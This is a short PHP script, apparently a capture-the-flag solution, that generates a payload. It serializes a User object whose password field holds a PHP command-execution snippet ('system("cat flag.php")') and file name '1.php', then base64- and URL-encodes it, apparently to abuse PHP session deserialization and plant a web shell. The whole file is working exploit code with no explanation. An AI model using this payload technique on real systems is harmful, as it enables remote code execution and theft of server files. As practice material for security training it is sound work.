<?php
class User{
    public $username = '1.php';
    public $password = '<?php system("cat flag.php") ?>';
}
$user = new User();
echo(urlencode(base64_encode('|'.serialize($user))));
?>
